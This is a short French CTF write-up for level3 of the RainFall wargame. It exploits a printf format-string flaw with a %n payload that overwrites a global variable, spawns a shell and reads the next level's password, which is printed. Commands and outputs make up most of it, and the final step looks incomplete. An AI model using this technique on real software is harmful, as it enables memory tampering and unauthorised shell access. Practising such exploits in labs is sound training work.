# Analyse du code

Dans le code nous voyons qu'il y a une fonction v(), qui ouvre un shell lorsque m = 0x40.
Nous ne pouvons pas interagir directement avec m, mais grace a printf qui manque de sanitazer, nous pouvons exploiter cette faille afin de changer la valeur de m

(%n permet d'affecter une valeur a une varaible dans printf. il va prendre le nombre de char avant) 

# Preparation du payload

- trouver le buffer utilser par printf

level3@RainFall:~$ echo $(python -c "print('a'*4 + '.%x' * 9)") | ./level3
aaaa.200.b7fd1ac0.b7ff37d0.61616161.2e78252e.252e7825.78252e78.2e78252e.252e7825

- adresse de m
	level3@RainFall:~$ objdump -t ./level3  |grep m
	./level3:     file format elf32-i386
	[…]
	08 04 98 8c   g     O .bss   00000004              m
	[…]
- payload
	 $(python -c  "print('\x8c\x98\x04\x08' + '%60x%4\$n')")
	 %60x -> 60char avant + adresse de m qui va faire 64 

# Exploit
	echo $(python -c  "print('\x8c\x98\x04\x08' + '%60x%4\$n')") > /tmp/_
	cat  /home/user/level4/.pass
	b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa